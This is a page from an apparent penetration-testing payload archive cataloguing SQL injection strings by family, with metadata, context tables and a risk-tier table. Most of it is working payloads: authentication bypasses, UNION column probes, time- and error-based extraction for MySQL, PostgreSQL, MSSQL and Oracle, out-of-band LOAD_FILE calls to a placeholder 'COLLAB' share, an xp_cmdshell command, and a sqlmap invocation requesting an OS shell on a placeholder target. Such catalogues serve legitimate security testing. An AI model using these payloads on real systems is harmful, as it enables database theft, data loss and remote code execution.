# SQL Injection Payload Families

| Field | Value |
|---|---|
| `corpus_id` | PL-WEB-SQLI |
| `cwe_id` | CWE-89 |
| `schema` | `12-schemas/payload.schema.json` |
| `provenance` | `PAT@master@2026-01-15`, `SQLMAP@1.9.1` |
| `wordlist` | `03-wordlists/web/fuzzing/injection-words.txt` |
| `crosswalk` | `10-crosswalk/wordlist-payload/crosswalk.csv` |

## 1. Why these live in JSON and not in a text file

A raw `.txt` of injection strings cannot answer "which of these work in a
*header*, against *PostgreSQL*, with *MySQL comment syntax* enabled?". The
archive therefore stores payloads as records validated by
`12-schemas/payload.schema.json`, and keeps a derived flat text export for
tools that only accept a wordlist.

```
payloads.json           <- source of truth, schema validated
injection-words.txt     <- derived export, consumed by ffuf/sqlmap/hydra
```

Regenerate the export with:

```bash
python tools/ssactl.py index --root .
```

## 2. Injection contexts (`context` field)

| Context | Marker | Detection signature |
|---|---|---|
| `query` | `' ... ` inside SQL text | tautology, comment terminator |
| `numeric` | `1 ...` unquoted | boolean/time based only |
| `identifier` | `ORDER BY 1` | `ORDER BY` + large number |
| `second-order` | stored then re-used | delayed anomaly in DB logs |
| `stack` | `; SELECT` | driver supports multi-statements |

## 3. Authentication bypass payloads

```text
' OR '1'='1
' OR '1'='1'-- -
' OR '1'='1'#
admin'-- -
' OR 1=1 LIMIT 1-- -
') OR ('1'='1
' OR ''='
' UNION SELECT NULL-- -
```

## 4. Union / column mapping

```text
' ORDER BY 1-- -                 -> increase until error = column count
' UNION SELECT NULL-- -
' UNION SELECT NULL,NULL-- -
' UNION SELECT NULL,NULL,NULL-- -
' UNION SELECT user(),version()-- -
```

## 5. Time based

```text
' AND SLEEP(5)-- -                MySQL
' AND pg_sleep(5)-- -             PostgreSQL
'; WAITFOR DELAY '0:0:5'-- -      MSSQL
' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)-- -   Oracle
```

## 6. Error based

```text
' AND extractvalue(1,concat(0x7e,version()))-- -   MySQL
' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM
  information_schema.tables GROUP BY x)a)-- -
' AND 1=CONVERT(int,(SELECT @@version))-- -          MSSQL
' AND cast((SELECT version()) as int)-- -            PostgreSQL
```

## 7. Out of band

```text
' AND (SELECT LOAD_FILE(CONCAT('\\\\', 'COLLAB\\share\\', 'x.txt')))-- -
' UNION SELECT LOAD_FILE(CONCAT('\\\\','COLLAB\\','x.txt'))-- -
'; EXEC xp_cmdshell('whoami')-- -          MSSQL only
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT user()),0x7e))-- -
```

## 8. Stacked / dangerous verbs

| Statement | Risk | Classification |
|---|---|---|
| `INTO OUTFILE '/var/www/html/x.php'` | RCE | T2 |
| `xp_cmdshell` | RCE | T2 |
| `LOAD_FILE` | data theft | T2 |
| `CREATE TABLE` / `DROP TABLE` | data loss | T2 |
| `SELECT` | data theft | T1 |
| Boolean probe | none | T0 |

Only the bottom of this table is appropriate for a routine web application
test. See `00-governance/data-classification.md`.

## 9. sqlmap mapping

```bash
sqlmap -u "https://TARGET/?id=1" \
       --technique=BEUSTQ \
       --level=5 --risk=2 \
       --tamper=space2comment,charencode,randomcase \
       --dbms= --string="Welcome" \
       --os-shell --shell 2>/dev/null
```

Every `--tamper` corresponds to a payload family above; see
`05-engines/sqlmap/tamper/tamper-library.md`.
